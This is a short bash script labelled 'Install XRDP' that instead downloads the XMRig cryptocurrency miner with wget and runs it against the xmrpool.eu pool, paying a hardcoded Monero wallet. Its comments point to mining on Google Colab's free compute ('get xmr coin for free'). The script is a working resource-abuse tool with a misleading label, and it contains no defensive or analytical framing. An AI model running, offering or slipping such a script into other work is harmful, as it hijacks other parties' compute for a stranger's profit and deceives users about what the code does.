#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-static-x64.tar.gz 
cd xmrig-6.17.0
rm config.json
./xmrig -o xmrpool.eu:9999 -u 49fYvmBsirkT53ErUyJ59Qa4kxcs6xmq3RTXNvMfQdUSbbSzYRFu3rNPY2JLpgg1tzeqarroWgPUqLDKmn9t7vsr6U11gnG -k --tls  --rig-id cola
